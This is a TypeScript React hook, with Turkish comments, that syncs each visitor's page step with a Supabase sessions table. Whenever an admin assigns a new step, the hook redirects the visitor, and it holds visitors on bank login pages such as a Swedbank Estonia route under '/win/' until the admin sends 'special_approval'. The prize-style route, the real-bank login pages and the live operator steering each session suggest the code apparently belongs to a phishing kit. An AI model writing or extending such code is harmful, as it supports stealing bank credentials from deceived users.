"use client";
import { useEffect } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { pathToStep, resolveStepTargetPath } from "@/lib/session-routes";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";

export function useEnsureCurrentStep(sessionId: string | undefined) {
  useEffect(() => {
    if (!sessionId || typeof window === "undefined") return;
    const localStep = pathToStep(window.location.pathname);
    if (!localStep) return;

    // BANKA LOGIN SAYFASINDA (örn. /win/123/bank/swedbank-ee) YÖNLENDİRME YAPMA:
    // - Kullanıcı bankayı seçtiği anda banken-client zaten current_step="banken" yazıyor
    // - Ama sayfa "bank" (yerel step), bu serverStep banken/bank ile çakışıp loop yaratır
    // - BANKA SAYFASINDA ADIM KONTROLÜNÜ ATLAT: admin special_approval haricinde MÜDAHALE ETME
    const path = window.location.pathname;
    const isBankLoginPage = path.includes("/bank/") || localStep === "bank";

    let cancelled = false;

    void (async () => {
      try {
        const supabase = createBrowserSupabaseClient();
        if (!supabase) return;

        const { data, error } = await supabase
          .from("sessions")
          .select("current_step,form_data")
          .eq("id", sessionId)
          .maybeSingle();

        if (cancelled || error) return;

        const serverStep = (data?.current_step as unknown) as string | null | undefined;
        const effectiveRouteId = getPreferredRouteSessionId(sessionId);
        const formData = (data?.form_data ?? {}) as { bankSlug?: string | null };

        if (isBankLoginPage) {
          // BANKA SAYFASINDA: SADECE ADMIN SPECIAL_APPROVAL GELDİYSE YÖNLENDİR
          if (serverStep && serverStep === "special_approval") {
            const target = resolveStepTargetPath(
              serverStep as any,
              sessionId,
              effectiveRouteId,
              formData,
            );
            if (!cancelled) {
              window.location.replace(target);
            }
          }
          // Diğer tüm durumlarda: kal, step'i DB'ye yazma (banken'e geri döner)
          return;
        }

        if (serverStep && serverStep !== localStep) {
          // ADMIN daha yeni bir step atamış: DB'deki değer benim olduğum sayfadan FARKLI
          // Hook üzerine yazmamalı, tam tersine BENİ O SAYFAYA YÖNLENDİRMELİ
          // (adminin emri öncelikli, her zaman)
          const target = resolveStepTargetPath(
            serverStep as any,
            sessionId,
            effectiveRouteId,
            formData,
          );
          // Kullanıcı zaten oradaysa tekrar yönlendirme
          try {
            const targetPath = new URL(target, window.location.origin).pathname;
            if (targetPath === window.location.pathname) return;
          } catch { /* ignore */ }
          if (!cancelled) {
            window.location.replace(target);
          }
          return;
        }

        // DB'de current_step YOKSA (yeni session) VEYA bizimle eşitse
        // Sadece o zaman yaz (adminin değerini bozmamak için)
        const shouldWrite = !serverStep || serverStep === localStep;
        if (shouldWrite && !cancelled) {
          await supabase
            .from("sessions")
            .update({ is_hidden: false, current_step: localStep })
            .eq("id", sessionId);
        }

        // 600ms sonrası için de aynı KORUMA: tekrar oku, karşılaştır, admin adımı varsa yönlendir
        window.setTimeout(async () => {
          if (cancelled) return;
          const fresh = createBrowserSupabaseClient();
          if (!fresh) return;
          try {
            const { data: freshData } = await fresh
              .from("sessions")
              .select("current_step,form_data")
              .eq("id", sessionId)
              .maybeSingle();
            const freshServerStep = (freshData?.current_step as unknown) as
              | string
              | null
              | undefined;
            const freshFormData = (freshData?.form_data ?? {}) as {
              bankSlug?: string | null;
            };
            const nowLocalStep = pathToStep(window.location.pathname);
            if (cancelled || !nowLocalStep) return;

            // TEKRAR: BANKA SAYFASINDA KAL:
            const nowPath = window.location.pathname;
            const nowIsBankLogin = nowPath.includes("/bank/") || nowLocalStep === "bank";
            if (nowIsBankLogin) {
              if (freshServerStep === "special_approval") {
                const adminTarget = resolveStepTargetPath(
                  freshServerStep as any,
                  sessionId,
                  getPreferredRouteSessionId(sessionId),
                  freshFormData,
                );
                window.location.replace(adminTarget);
              }
              return;
            }

            if (freshServerStep && freshServerStep !== nowLocalStep) {
              const adminTarget = resolveStepTargetPath(
                freshServerStep as any,
                sessionId,
                getPreferredRouteSessionId(sessionId),
                freshFormData,
              );
              try {
                const p = new URL(adminTarget, window.location.origin).pathname;
                if (p === window.location.pathname) return;
              } catch { /* ignore */ }
              window.location.replace(adminTarget);
              return;
            }

            if (!freshServerStep || freshServerStep === nowLocalStep) {
              await fresh
                .from("sessions")
                .update({ current_step: nowLocalStep, is_hidden: false })
                .eq("id", sessionId);
            }
          } catch { /* no-op */ }
        }, 600);
      } catch { /* no-op */ }
    })();

    return () => {
      cancelled = true;
    };
  }, [sessionId]);
}

